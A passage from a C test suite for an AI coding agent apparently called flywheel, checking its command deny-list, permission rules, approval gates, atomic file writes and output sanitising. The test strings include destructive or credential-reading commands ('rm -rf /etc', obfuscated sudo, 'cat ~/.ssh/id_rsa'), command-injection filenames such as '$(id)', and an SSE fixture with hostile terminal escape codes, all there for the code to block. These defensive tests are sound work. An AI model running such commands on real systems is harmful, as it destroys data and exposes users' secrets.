            "$'\\x73udo' ls", "$'sudo' ls",
            "bash -c $'rm\\t-rf\\t/etc;true'", "eval $'sudo\\x20ls\\ntrue'",
            "eval sudo ls", "eval rm '-rf /etc'", "bash -o pipefail -c 'rm -rf /etc'",
            "bash -eo pipefail -c 'sudo ls'", "bash +O extglob -c 'sudo ls'",
            "bash --rcfile x -c 'sudo ls'", "echo $(( $(sudo ls) ))", "echo $((sudo ls); (true))",
            "x=$(( `sudo ls` ))", NULL};
        for (int i = 0; blocked[i]; i++) T(blocked[i], deny_check(blocked[i], projdir) != NULL);
        static const char *fine[] = {"rm -rf build/*", "echo x > out.txt", "printf $'a\\n' > o",
            "rm -f .env.bak", "rm -rf .next*", "mv .eslintrc* config",
            "echo $((1 << 2))", "echo $(( n > 3 ))", "bash -o pipefail -c 'ls | head'", "echo x > ${HOME_X}f", NULL};
        for (int i = 0; fine[i]; i++) T(fine[i], deny_check(fine[i], projdir) == NULL);
        static char many[20000];
        strcpy(many, "rm -rf");
        for (int i = 0; i < 4200; i++) strcat(many, " a");
        strcat(many, " /etc");
        T("too many words fails closed", deny_check(many, projdir) != NULL);
        T("deep nesting fails closed",
          deny_check("eval eval eval eval eval eval eval sudo ls", projdir) != NULL);
    }
    T("repo filename ok", safe_repo_filename("model-00001.safetensors") && safe_repo_filename("a/b.json"));
    T("repo filename rejects injection",
      !safe_repo_filename("a\";id;\".bin") && !safe_repo_filename("$(id)") && !safe_repo_filename("`id`") &&
      !safe_repo_filename("../x") && !safe_repo_filename("/etc/x") && !safe_repo_filename("-o") && !safe_repo_filename(""));
    char pf[1200];
    if (perm_project_file(pf, sizeof pf)) unlink(pf);
    perm_free();
}

static size_t asked_len;
static bool record_ask(const char *cmd, bool gate, void *ud) { (void)gate; (void)ud; asked_len = strlen(cmd); return false; }

static void test_agent_strict(void) {
    char dir[] = "/tmp/fwstrictXXXXXX", p[256];
    if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(dir);
    Ui ui = {.interactive = true};
    Msgs m;
    static const char *const broken[] = {
        "bash", "{\"command\":\"touch closed.txt\"",            /* auto-closable */
        "bash", "{\"command\":\"touch cut.txt",                 /* truncated */
        "bash", "run \"command\": \"touch scanned.txt\""};      /* key-scannable */
    new_task(&m);
    run_agent(&m, "tool_calls", 3, broken, 1, &ui);
    static const char *const f[] = {"closed.txt", "cut.txt", "scanned.txt"};
    for (int i = 0; i < 3; i++) {
        snprintf(p, sizeof p, "%s/%s", dir, f[i]);
        T("broken bash arguments never run", access(p, F_OK) != 0);
    }
    T("model told why (bash)", has_msg(&m, "tool", "not complete valid JSON"));
    msgs_free(&m);

    /* the approval prompt gets the whole path, however long */
    char args[2200];
    size_t w = (size_t)snprintf(args, sizeof args, "{\"path\":\"");
    for (int i = 0; i < 1800; i++) args[w++] = i % 100 == 99 ? '/' : 'p';
    snprintf(args + w, sizeof args - w, "\",\"content\":\"x\"}");
    const char *const longw[] = {"write_file", args};
    Ui ask = {.interactive = true, .approve_cmd = record_ask};
    asked_len = 0;
    new_task(&m);
    run_agent(&m, "tool_calls", 1, longw, 1, &ask);
    T("long path not truncated in approval", asked_len == strlen("write_file ") + 1800);
    msgs_free(&m);
}

/* ---------- the real binary: init and non-interactive output ---------- */

/* run ./flywheel, stdout on a pty or a pipe; returns what it printed */
static int run_status;   /* exit code of the last run */

static char *run_flywheel(bool tty, char *const *argv) {
    static char out[65536];
    int rd = -1, wr = -1, fds[2];
    if (tty) {
        rd = posix_openpt(O_RDWR | O_NOCTTY);
        if (rd >= 0 && !grantpt(rd) && !unlockpt(rd)) wr = open(ptsname(rd), O_WRONLY | O_NOCTTY);
    } else if (!pipe(fds)) { rd = fds[0]; wr = fds[1]; }
    out[0] = 0;
    if (wr < 0) return out;
    fflush(stdout);
    pid_t pid = fork();
    if (!pid) {
        alarm(20);
        int nul = open("/dev/null", O_RDWR);
        dup2(nul, 0); dup2(wr, 1); dup2(nul, 2);
        close(rd); close(wr);
        const char *bin = getenv("FW_BIN");
        execv(bin ? bin : "./flywheel", argv);
        _exit(127);
    }
    if (!tty) close(wr);   /* keep the pty slave open so its output survives */
    fcntl(rd, F_SETFL, O_NONBLOCK);
    size_t len = 0;
    int st = 0;
    run_status = -1;
    for (bool exited = false;;) {
        ssize_t n = read(rd, out + len, sizeof out - 1 - len);
        if (n > 0) { len += (size_t)n; continue; }
        if (exited) break;
        exited = waitpid(pid, &st, WNOHANG) == pid;
        if (exited && WIFEXITED(st)) run_status = WEXITSTATUS(st);
        if (!exited) usleep(10000);
    }
    out[len] = 0;
    close(rd);
    if (tty) close(wr);
    return out;
}

static void test_init_nofollow(void) {
    char dir[] = "/tmp/fwinitXXXXXX", outd[] = "/tmp/fwinitoutXXXXXX";
    if (!mkdtemp(dir) || !mkdtemp(outd)) { T("mkdtemp", false); return; }
    char link[128], target[128];
    snprintf(link, sizeof link, "%s/.flywheel.md", dir);
    snprintf(target, sizeof target, "%s/victim", outd);
    T("init: link", !symlink(target, link));
    char *av[] = {"flywheel", "-C", dir, "-e", "http://127.0.0.1:1/v1", "init", NULL};
    char *o = run_flywheel(false, av);
    T("init: ran", strstr(o, "profile:") != NULL);
    T("init: dangling link not written through", access(target, F_OK) != 0);
    unlink(link);
    run_flywheel(false, av);
    struct stat st;
    T("init: regular file created", !lstat(link, &st) && S_ISREG(st.st_mode) && st.st_size > 0);
}

#define EVIL_SSE "data: {\"choices\":[{\"delta\":{\"reasoning_content\":\"th\\u001b[2Jk\"}}]}\n\n" \
    "data: {\"choices\":[{\"delta\":{\"content\":\"tx\\u001b]52;c;aGk=\\u0007\\u202e\"}}]}\n\n" \
    "data: {\"choices\":[{\"delta\":{},\"finish_reason\":\"fin\\u001b[2J\"}]}\n\ndata: [DONE]\n\n"

static void test_plain_output_sanitized(void) {
    bad_reply = OK_HDR EVIL_SSE;
    pid_t srv = serve(reply_fixed);
    char dir[] = "/tmp/fwplainXXXXXX";
    if (!mkdtemp(dir)) { T("mkdtemp", false); stop(srv); return; }
    char *av[] = {"flywheel", "-C", dir, "-e", g_cfg.endpoint, "-T", "1", "hi", NULL};
    char *o = run_flywheel(true, av);
    T("tty: text visible", strstr(o, "tx^[]52;c;aGk=^G<U+202E>") != NULL);
    T("tty: thinking visible", strstr(o, "th^[[2Jk") != NULL);
    T("tty: no hostile escapes", !strstr(o, "\033[2J") && !strstr(o, "\033]52"));
    o = run_flywheel(false, av);
    T("pipe: text passed through", strstr(o, "tx\033]52") != NULL);

    char p[256];
    snprintf(p, sizeof p, "%s/tasks", dir); mkdir(p, 0755);
    snprintf(p, sizeof p, "%s/tasks/t1", dir); mkdir(p, 0755);
    snprintf(p, sizeof p, "%s/tasks/t1/prompt.md", dir); put(p, "hi\n");
    char *bv[] = {"flywheel", "-e", g_cfg.endpoint, "-T", "1", "bench", dir, "tg", "t1", NULL};
    o = run_flywheel(false, bv);
    T("bench: line sanitized", strstr(o, "fin=fin^[[2J") && !strchr(o, '\033'));
    stop(srv);
}

/* ---------- pre-launch review fixes ---------- */

static void test_deny_operands(void) {
    const char *cwd = "/tmp/sb";
    static const char *no[] = {
        "rm /etc/x", "rm -f ~/x", "rm a $HOME/x", "rm -- ../x", "rm src/{a,../../x}",
        "find /etc -delete", "find -L /etc -name x -delete", "find . /etc -exec rm {} +",
        "find /etc -exec sed -i s/a/b/ {} \\;", "find . -exec rm /etc/x \\;", "find . -exec sh -c 'rm /etc/x' \\;",
        "find /etc -execdir chmod 600 {} +", "find . -fprint /etc/x",
        "sed -i s/a/b/ /etc/x", "sed -i '' -e s/a/b/ /etc/x", "sed -i.bak '/a/d' /etc/x",
        "sed -Ei s/a/b/ ~/x", "sed --in-place s/a/b/ /etc/x",
        "sed s/a/b/ -i /etc/x",
        "perl -pi -e s/a/b/ /etc/x", "perl -i.bak -pe s/a/b/ ~/x", "perl -pie s/a/b/ /etc/x",
        "truncate -s 0 /etc/x", "ln -s a /etc/x", "ln -sf a ~/x", "ln /etc/passwd copy", "ln -t /etc a",
        "chmod 600 /etc/x", "chmod -R u+w ~", "chmod -w /etc/x", "chown me /etc/x", "chgrp -R staff /etc",
        "rsync -a src/ /etc/x/", "rsync -a --remove-source-files /etc/x out/", "install -m 755 a /etc/x",
        "install -d /etc/x", "install -t /etc a", "touch /etc/x", "touch ~/x", "mkdir -p /etc/x",
        "mkdir ../x", "rmdir /etc/x", "git -C /etc reset --hard", "git -C .. clean -fdx",
        "git --git-dir=/etc/x commit -m a", "git --work-tree /etc checkout .", "timeout 5 touch /etc/x", NULL};
    for (int i = 0; no[i]; i++) T(no[i], deny_check(no[i], cwd) != NULL);
    static const char *yes[] = {
        "rm a.o", "rm -f build/*.o", "rm src/{a,b}.o", "rm /tmp/x", "rm \"$TMPDIR/x\"", "rm ${TMPDIR}/x",
        "rm /tmp/sb/x", "find . -name '*.tmp' -delete", "find /tmp/x -delete", "find src -exec rm {} +",
        "find /usr/include -name x.h", "find /usr/include -exec grep -l x {} +", "find . -type f -exec sed -i s/a/b/ {} \\;",
        "sed -i s/a/b/ src/a.c", "sed -i '' '/^$/d' src/a.c", "sed -i -e '/x/d' a b", "sed -n /x/p /etc/hosts",
        "sed -i '/^#/d' conf", "perl -pi -e 's|/usr|/opt|' conf", "perl -ne print /etc/hosts", "perl -e 'print 1'",
        "truncate -s 0 log.txt", "ln -s /usr/bin/python3 venv/python", "ln -sf ../lib/a b", "ln -s /usr/lib/x",
        "ln a b", "chmod +x run.sh", "chmod -R 755 dist", "chown -R me .", "rsync -a src/ /tmp/out/",
        "rsync -a /usr/share/x/ vendor/", "rsync -a dist/ host:/var/www/", "install -m 755 flywheel /tmp/bin/x",
        "install -d build/out", "touch a b", "touch -r /etc/hosts a", "mkdir -p src/{components,utils}",
        "mkdir -p /tmp/x/y", "mkdir -m 755 out", "rmdir build", "git -C sub commit -m x", "git -C /etc log --oneline",
        "git -C /tmp/x init", "git commit -m 'rm /etc/x'", "echo hi > /dev/null", "echo x > $TMPDIR/x", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], deny_check(yes[i], cwd) == NULL);
}

static void test_remember_inline(void) {
    static const char *no[] = {
        "python3 -c 'print(1)'", "python -c x", "python3 -m http.server", "node -e x", "node --eval x",
        "node -p x", "node", "python3", "python3.12 -c x", "/usr/bin/python3 -c x", "bash -c ls", "sh x.sh",
        "zsh -c ls", "perl -e 1", "ruby -e 1", "php -r 1", "osascript -e x", "awk 'BEGIN{}'", "env make",
        "xargs rm", "eval ls", "ssh host ls", "deno eval x", "bun -e x", "git -c core.pager=x log",
        "npx -c x", "npm exec x", "make --eval=x", NULL};
    for (int i = 0; no[i]; i++) { char *p = perm_prefix(no[i]); T(no[i], p && !*p); free(p); }
    char *p = perm_prefix("nodemon app.js");
    T("unlisted tool: nothing offered", p && !*p);
    free(p);
    p = perm_prefix("python3 manage.py test");
    T("script path is not a fixed subcommand", p && !*p);
    free(p);
}

static void test_autoallow_paths(void) {
    char dir[] = "/tmp/fwreadXXXXXX", l[256];
    if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(dir);
    snprintf(l, sizeof l, "%s/out", dir);
    T("link", !symlink("/etc", l));
    perm_free();
    static const char *no[] = {
        "cat /etc/passwd", "cat '~/.ssh/id_rsa'", "cat ../x", "head -n 1 a/../../x", "ls /", "ls ..",
        "grep -r x /etc", "grep -f/etc/passwd a", "grep --file=/etc/passwd a", "find /etc -name x",
        "tail out/passwd", "wc -l a /etc/passwd", "cd ..", "rg x /etc", "sort ../x", "stat /etc", NULL};
    for (int i = 0; no[i]; i++) T(no[i], !perm_allowed(no[i]));
    char in[300];
    snprintf(in, sizeof in, "cat %s/a.txt", dir);
    T("absolute inside cwd", perm_allowed(in));
    static const char *yes[] = {"cat a.txt", "ls -la src/", "cat src/../a.txt", "grep -rn foo .", "cut -d/ -f1 a",
        "echo /etc/passwd ..", "which /bin/ls", "grep x /dev/null", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], perm_allowed(yes[i]));
    perm_add_rule("cat");   /* never turns an outside read into a silent one */
    T("saved reader rule stays confined", !perm_allowed("cat /etc/passwd"));
    char pf[1200];
    if (perm_project_file(pf, sizeof pf)) unlink(pf);
    perm_free();
}

static const char *reply_prune(int n) {
    static const char *const first[] = {"bash", "{\"command\":\"echo VALID_EARLIER\"}"};
    static const char *const loop[] = {"bash", "{\"command\":\"echo SAME\"}",
        "bash", "{\"command\":\"echo SAME\"}", "bash", "{\"command\":\"echo SAME\"}"};
    if (n == 0) return tool_reply("tool_calls", 1, first);
    if (n == 1) return tool_reply("tool_calls", 3, loop);
    return OK_HDR STOPPED "data: [DONE]\n\n";
}

static void test_prune_parallel(void) {
    char dir[] = "/tmp/fwpruneXXXXXX";
    if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(dir);
    Ui ui = {.interactive = true};
    Msgs m;
    new_task(&m);
    pid_t p = serve(reply_prune);
    agent_run(&m, &ui, NULL, 0);
    stop(p);
    T("parallel loop was pruned", has_msg(&m, "user", "Loop detected"));
    T("valid earlier turn survives", has_msg(&m, "tool", "VALID_EARLIER"));
    T("looping turn removed", !has_msg(&m, "tool", "SAME"));
    msgs_free(&m);
}

/* ---------- verification gate: exit status decides ---------- */

static void fake_tool(const char *dir, const char *name, const char *body) {
    char p[300], s[600];
    snprintf(p, sizeof p, "%s/%s", dir, name);
    snprintf(s, sizeof s, "#!/bin/sh\n%s\n", body);
    put(p, s);
    chmod(p, 0755);
}

static bool gate(const char *prof, const char *cwd, const char *must_contain) {
    bool failed;
    char *o = gate_run(profile_detect(cwd, prof), cwd, 20, &failed);
    if (must_contain) T(must_contain, strstr(o, must_contain) != NULL);
    T("gate output bounded", strlen(o) <= 1800);
    free(o);
    return failed;
}

static void test_gate(void) {
    char dir[] = "/tmp/fwgateXXXXXX";
    if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
    char *old = str_dup(getenv("PATH"));
    char path[4096];
    snprintf(path, sizeof path, "%s:%s", dir, old);
    setenv("PATH", path, 1);

    fake_tool(dir, "go", "echo 'vet: ./a.go:3:2: undefined: x' >&2; exit 1");
    T("go: compile error without the word fails", gate("go", dir, "undefined: x"));
    fake_tool(dir, "go", "case \" $* \" in *' -atomic '*) exit 0;; esac; echo './a.go:5:2: Printf format %d has wrong type'; exit 1");
    T("go: style finding passes", !gate("go", dir, NULL));
    fake_tool(dir, "go", "echo 'go: warning: \"./...\" matched no packages' >&2; echo 'no packages to vet' >&2; exit 1");
    T("go: nothing to vet passes", !gate("go", dir, NULL));
    fake_tool(dir, "go", "exit 0");
    T("go: clean passes", !gate("go", dir, NULL));
    fake_tool(dir, "cargo", "echo 'src/a.rs:1: warning: unused `Error`: error type'; exit 0");
    T("rust: warning mentioning error passes", !gate("rust", dir, NULL));
    fake_tool(dir, "cargo", "i=0; while [ $i -lt 200 ]; do echo \"warning: w$i padding padding\"; i=$((i+1)); done;"
                            " echo 'could not compile LAST'; exit 101");
    T("rust: failing status survives long output", gate("rust", dir, "could not compile LAST"));
    fake_tool(dir, "npx", "echo 'a.ts(1,1): error TS2304: x'; exit 2");
    T("ts: diagnostics fail", gate("ts", dir, "TS2304"));
    fake_tool(dir, "npx", "exit 0");
    T("ts: clean passes", !gate("ts", dir, NULL));
    fake_tool(dir, "npx", "echo 'npm error could not determine executable to run'; exit 1");
    T("ts: no typescript installed is not a code error", !gate("ts", dir, NULL));
    fake_tool(dir, "go", "exit 127");
    T("tool not installed is not a code error", !gate("go", dir, NULL));
    setenv("PATH", old, 1);
    free(old);

    if (!system("command -v python3 >/dev/null 2>&1")) {
        char f[300];
        snprintf(f, sizeof f, "%s/ok.py", dir);
        put(f, "error = 'Error'\n");
        T("python: valid file passes", !gate("python", dir, NULL));
        snprintf(f, sizeof f, "%s/bad.py", dir);
        put(f, "def (:\n");
        T("python: syntax error fails", gate("python", dir, "bad.py"));
    }
    T("generic: no gate", !gate("generic", dir, NULL));
}

/* ---------- questions, deliverables, approvals, wall clock ---------- */

static int text_turns(const Msgs *m) {
    int n = 0;
    for (int i = 0; i < m->n; i++) n += !strcmp(m->v[i].role, "assistant");
    return n;
}

static int asked;
static bool count_ask(const char *cmd, bool gate, void *ud) { (void)cmd; (void)gate; (void)ud; asked++; return true; }

static const char *reply_stall(int n) { (void)n; sleep(30); return OK_HDR STOPPED; }

static void test_agent_review(void) {
    char dir[] = "/tmp/fwrevXXXXXX";
    if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(dir);
    int gates = g_cfg.max_gates;
    g_cfg.max_gates = 1;
    Msgs m;

    Ui q = {.interactive = false};
    new_task(&m);
    const char *fin = run_agent(&m, "tool_calls", 0, NULL, 0, &q);
    T("one-shot question: first answer ends the task", !strcmp(fin, "done") && text_turns(&m) == 2);
    T("one-shot question: no write nag", !has_msg(&m, "user", "written any"));
    msgs_free(&m);

    Ui d = {.interactive = false, .deliverable = true};
    new_task(&m);
    run_agent(&m, "tool_calls", 0, NULL, 0, &d);
    T("deliverable: nag kept", has_msg(&m, "user", "You have not written any implementation files"));
    msgs_free(&m);
    static const char *const wr[] = {"write_file", "{\"path\":\"a.txt\",\"content\":\"x\"}"};
    new_task(&m);
    run_agent(&m, "tool_calls", 1, wr, 1, &d);
    T("deliverable: verify pass kept", has_msg(&m, "user", "Before finishing"));
    msgs_free(&m);
    g_cfg.max_gates = gates;

    static const char *const denied[] = {"bash", "{\"command\":\"touch /etc/fw > x\"}"};
    Ui a = {.deliverable = true, .approve_cmd = count_ask};
    asked = 0;
    new_task(&m);
    run_agent(&m, "tool_calls", 1, denied, 1, &a);
    T("denied command is not put up for approval", asked == 0 && has_msg(&m, "tool", "forbidden"));
    T("denied command does not count as written", has_msg(&m, "user", "written any implementation"));
    msgs_free(&m);

    g_cfg.wall = 2;
    pid_t p = serve(reply_stall);
    new_task(&m);
    time_t t0 = time(NULL);
    Ui w = {.interactive = true};
    fin = agent_run(&m, &w, NULL, 0);
    T("-W bounds a stalled request", time(NULL) - t0 <= 6 && !strcmp(fin, "wall"));
    stop(p);
    msgs_free(&m);
    g_cfg.wall = 0;
}

/* ---------- gate approval ---------- */

static int gate_asks;
static bool gate_answer;
static char gate_asked[600];
static bool gate_ask(const char *cmd, bool gate, void *ud) {
    (void)ud;
    if (!gate) return true;   /* the write itself */
    gate_asks++;
    snprintf(gate_asked, sizeof gate_asked, "%s", cmd);
    return gate_answer;
}

static bool any_msg(const Msgs *m, const char *frag) {
    for (int i = 0; i < m->n; i++)
        if (m->v[i].content && strstr(m->v[i].content, frag)) return true;
    return false;
}

static void test_gate_approval(void) {
    char dir[] = "/tmp/fwgaXXXXXX";
    if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
    char *oldpath = str_dup(getenv("PATH"));
    char path[4096], mark[600], body[700];
    snprintf(path, sizeof path, "%s:%s", dir, oldpath);
    setenv("PATH", path, 1);
    snprintf(mark, sizeof mark, "%s/ran", dir);
    snprintf(body, sizeof body, "echo x >> '%s'; exit 0", mark);
    fake_tool(dir, "go", body);
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(dir);
    perm_free();
    char *prof = g_cfg.profile;
    g_cfg.profile = (char *)"go";
    int gates = g_cfg.max_gates, every = g_cfg.gate_every, turns = g_cfg.maxturns;
    g_cfg.max_gates = 0;
    g_cfg.gate_every = 0;
    g_cfg.maxturns = 20;
    static const char *const wr[] = {"write_file", "{\"path\":\"a.go\",\"content\":\"x\"}"};
    Msgs m;
    char sum[256];

    Ui u = {.interactive = true, .approve_cmd = gate_ask};
    gate_asks = 0; gate_answer = false;
    new_task(&m);
    agent_finish_reason = "tool_calls"; agent_calls = wr; agent_ncalls = 1; agent_tool_turns = 1;
    pid_t p = serve(reply_agent);
    const char *fin = agent_run(&m, &u, sum, sizeof sum);
    stop(p);
    T("gate: interactive asks first", gate_asks == 1);
    T("gate: approval shows the command", !strcmp(gate_asked, "go vet -atomic ./..."));
    T("gate: denied is not run", access(mark, F_OK) != 0);
    T("gate: denied shows in the summary", !strcmp(fin, "done") && strstr(sum, "check=skipped"));
    msgs_free(&m);

    gate_asks = 0; gate_answer = true;
    new_task(&m);
    agent_finish_reason = "tool_calls";
    p = serve(reply_agent);
    agent_run(&m, &u, sum, sizeof sum);
    stop(p);
    T("gate: approved runs", gate_asks == 1 && access(mark, F_OK) == 0 && !strstr(sum, "check=skipped"));
    msgs_free(&m);
    unlink(mark);

    Ui one = {.interactive = false};
    gate_asks = 0;
    new_task(&m);
    run_agent(&m, "tool_calls", 1, wr, 1, &one);
    T("gate: one-shot stays unprompted", access(mark, F_OK) == 0);
    msgs_free(&m);
    unlink(mark);

    g_cfg.gate_every = 1;
    g_cfg.max_gates = 1;
    gate_asks = 0; gate_answer = false;
    new_task(&m);
    run_agent(&m, "tool_calls", 1, wr, 2, &u);
    T("gate: asked once per task after a denial", gate_asks == 1 && access(mark, F_OK) != 0);
    T("gate: model told it was not run", has_msg(&m, "user", "was not run"));
    T("gate: verify pass does not imply a pass", has_msg(&m, "user", "Before finishing") &&
      !any_msg(&m, "check passed"));
    msgs_free(&m);
    g_cfg.gate_every = 0;
    g_cfg.max_gates = 0;

    static const char *const same[] = {"bash", "{\"command\":\"echo same\"}"};
    gate_asks = 0;
    new_task(&m);
    run_agent(&m, "tool_calls", 1, same, 4, &u);
    T("gate: loop breaker asks too", gate_asks == 1 && access(mark, F_OK) != 0);
    T("gate: pruned report says not run", has_msg(&m, "user", "Current type check:\n(not run"));
    msgs_free(&m);

    const char *what = "go vet -atomic ./...";
    T("gate: not approved before", !perm_gate_allowed(what));
    perm_add_rule(GATE_PERM "go vet -atomic ./...");
    T("gate: remembered", perm_gate_allowed(what));
    T("gate: no wider command", !perm_gate_allowed("go vet -atomic ./... ./x") &&
      !perm_gate_allowed("go vet ./..."));
    T("gate: rule grants no bash command", !perm_allowed(what) && !perm_allowed(GATE_PERM "go vet -atomic ./..."));
    /* a model command that looks like a gate stays an ordinary command */
    static const char *const fake[] = {"bash", "{\"command\":\"gate: x\\ntrue\"}"};
    gate_asks = 0;
    new_task(&m);
    run_agent(&m, "tool_calls", 1, fake, 1, &u);
    T("gate: model command is not a gate", gate_asks == 0);
    msgs_free(&m);
    gate_asks = 0;
    new_task(&m);
    run_agent(&m, "tool_calls", 1, wr, 1, &u);
    T("gate: remembered runs unasked", gate_asks == 0 && access(mark, F_OK) == 0);
    msgs_free(&m);
    char pf[1200];
    if (perm_project_file(pf, sizeof pf)) unlink(pf);
    perm_free();

    g_cfg.gate_every = every; g_cfg.max_gates = gates; g_cfg.maxturns = turns;
    g_cfg.profile = prof;
    setenv("PATH", oldpath, 1);
    free(oldpath);
}

/* ---------- file tools: atomic writes, overlapping matches, empty files ---------- */

static int dir_entries(const char *dir) {
    DIR *d = opendir(dir);
    int n = 0;
    for (struct dirent *e; d && (e = readdir(d)); )
        if (strcmp(e->d_name, ".") && strcmp(e->d_name, "..")) n++;
    if (d) closedir(d);
    return n;
}

static bool holds(const char *path, const char *want) {
    char *c = slurp(path);
    bool ok = c && !strcmp(c, want);
    free(c);
    return ok;
}

static void test_atomic(void) {
    char dir[] = "/tmp/fwatomXXXXXX", p[256], l[256];
    if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
    snprintf(p, sizeof p, "%s/run.sh", dir);
    put(p, "aaa");
    chmod(p, 0755);

    char *r = tool_edit_file(dir, "run.sh", "aa", "b");
    T("overlapping matches are ambiguous", strstr(r, "2 places") && holds(p, "aaa"));
    free(r);

    struct stat a, b;
    stat(p, &a);
    r = tool_write_file(dir, "run.sh", "new body\n");
    stat(p, &b);
    T("write replaces by rename", !strncmp(r, "ok:", 3) && a.st_ino != b.st_ino && holds(p, "new body\n"));
    T("write keeps the mode", (b.st_mode & 07777) == 0755);
    free(r);
    r = tool_edit_file(dir, "run.sh", "new", "old");
    stat(p, &a);
    T("edit replaces by rename", !strncmp(r, "ok:", 3) && a.st_ino != b.st_ino && holds(p, "old body\n"));
    T("edit keeps the mode", (a.st_mode & 07777) == 0755);
    free(r);

    /* a write that cannot complete leaves the old file and no temp file */
    fflush(stdout);
    pid_t pid = fork();
    if (pid == 0) {
        signal(SIGXFSZ, SIG_IGN);
        struct rlimit lim = {4, 4};
        setrlimit(RLIMIT_FSIZE, &lim);
        char *w = tool_write_file(dir, "run.sh", "much longer than the limit\n");
        char *e = tool_edit_file(dir, "run.sh", "old", "newer");
        _exit((strncmp(w, "error:", 6) ? 1 : 0) | (strncmp(e, "error:", 6) ? 2 : 0));
    }
    int st = 0;
    waitpid(pid, &st, 0);
    T("failed write is reported", WIFEXITED(st) && WEXITSTATUS(st) == 0);
    T("failed write keeps the old file", holds(p, "old body\n"));
    T("failed write leaves no temp file", dir_entries(dir) == 1);

    if (geteuid() != 0) {
        chmod(p, 0444);
        r = tool_write_file(dir, "run.sh", "x");
        T("read-only file stays", !strncmp(r, "error:", 6) && holds(p, "old body\n"));
        free(r);
        chmod(p, 0755);
    }

    snprintf(l, sizeof l, "%s/link.sh", dir);
    T("symlink made", !symlink("run.sh", l));
    r = tool_write_file(dir, "link.sh", "via link\n");
    T("in-project symlink updates its target", holds(p, "via link\n") && !lstat(l, &a) && S_ISLNK(a.st_mode));
    free(r);

    r = tool_write_file(dir, "fresh.txt", "");
    snprintf(l, sizeof l, "%s/fresh.txt", dir);
    mode_t um = umask(0);
    umask(um);
    T("new file follows umask", !stat(l, &a) && a.st_size == 0 && (a.st_mode & 07777) == (0666 & ~um));
    free(r);

    /* a hard link can name a file outside the project: never write through it */
    char h[256], out_[] = "/tmp/fwoutXXXXXX";
    int ofd = mkstemp(out_);
    T("outside file made", ofd >= 0 && write(ofd, "outside", 7) == 7);
    close(ofd);
    snprintf(h, sizeof h, "%s/inside", dir);
    T("hard link made", !link(out_, h));
    r = tool_write_file(dir, "inside", "overwritten");
    T("write refuses a hard-linked file", !strncmp(r, "error:", 6) && strstr(r, "hard links"));
    T("write leaves the outside content", holds(out_, "outside"));
    free(r);
    r = tool_edit_file(dir, "inside", "out", "in");
    T("edit refuses a hard-linked file", !strncmp(r, "error:", 6) && strstr(r, "hard links"));
    T("edit leaves the outside content", holds(out_, "outside"));
    free(r);
    unlink(out_);

    gid_t groups[64];
    int ng = getgroups(64, groups);
    snprintf(p, sizeof p, "%s/grp", dir);
    put(p, "x");
    stat(p, &a);
    for (int i = 0; i < ng; i++) {
        if (groups[i] == a.st_gid || chown(p, (uid_t)-1, groups[i])) continue;
        r = tool_write_file(dir, "grp", "y");
        stat(p, &b);
        T("write keeps the group", b.st_gid == groups[i] && holds(p, "y"));
        free(r);
        break;
    }

    if (geteuid() != 0) {
        char sub_[256];
        snprintf(sub_, sizeof sub_, "%s/ro", dir);
        mkdir(sub_, 0755);
        snprintf(p, sizeof p, "%s/ro/f", dir);
        put(p, "old");
        chmod(sub_, 0555);
        r = tool_write_file(dir, "ro/f", "new");
        T("writable file in a read-only directory is written", !strncmp(r, "ok:", 3) && holds(p, "new"));
        free(r);
        fflush(stdout);
        pid = fork();
        if (pid == 0) {
            signal(SIGXFSZ, SIG_IGN);
            struct rlimit lim = {4, 4};
            setrlimit(RLIMIT_FSIZE, &lim);
            char *w = tool_write_file(dir, "ro/f", "much longer than the limit\n");
            _exit(strncmp(w, "error:", 6) || strstr(w, "nothing was changed") ? 1 : 0);
        }
        st = 0;
        waitpid(pid, &st, 0);
        T("failed in-place write does not claim nothing changed", WIFEXITED(st) && WEXITSTATUS(st) == 0);
        chmod(sub_, 0755);
    } else {
        puts("skipped as root: in-place write tests");
    }
    snprintf(p, sizeof p, "%s/run.sh", dir);

    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(dir);
    Ui u = {.interactive = true};
    Msgs m;
    static const char *const empty[] = {
        "write_file", "{\"path\":\"run.sh\",\"content\":\"\"",     /* truncated */
        "write_file", "{\"path\":\"run.sh\"}"};                    /* no content */
    new_task(&m);
    run_agent(&m, "tool_calls", 2, empty, 1, &u);
    T("truncated or missing content never empties a file", holds(p, "via link\n"));
    msgs_free(&m);
    static const char *const none[] = {"write_file", "{\"path\":\"run.sh\",\"content\":\"\"}"};
    new_task(&m);
    run_agent(&m, "tool_calls", 1, none, 1, &u);
    T("an empty file can be written", holds(p, ""));
    msgs_free(&m);
}

/* ---------- exit status and check outcome reach the model and the user ---------- */

static int once_asks;
static bool gate_once(const char *cmd, bool gate, void *ud) {
    (void)cmd; (void)ud;
    return !gate || !once_asks++;
}

static void test_truth(void) {
    char dir[] = "/tmp/fwtruthXXXXXX";
    if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
    char *oldpath = str_dup(getenv("PATH"));
    char path[4096], tr[600], sum[256];
    snprintf(path, sizeof path, "%s:%s", dir, oldpath);
    setenv("PATH", path, 1);
    snprintf(tr, sizeof tr, "%s/tr.jsonl", dir);
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(dir);
    char *prof = g_cfg.profile;
    g_cfg.profile = (char *)"go";
    int gates = g_cfg.max_gates, turns = g_cfg.maxturns, to = g_cfg.cmd_timeout;
    g_cfg.max_gates = 0; g_cfg.maxturns = 8; g_cfg.cmd_timeout = 1;
    Ui u = {.interactive = true};
    Msgs m;

    static const char *const bad[] = {"bash", "{\"command\":\"echo hi; exit 3\"}",
                                      "bash", "{\"command\":\"echo fine\"}",
                                      "bash", "{\"command\":\"sleep 5\"}",
                                      "bash", "{\"command\":\"kill -9 $$\"}",
                                      "bash", "{\"command\":\"echo 'error: boom'; kill -9 $$\"}"};
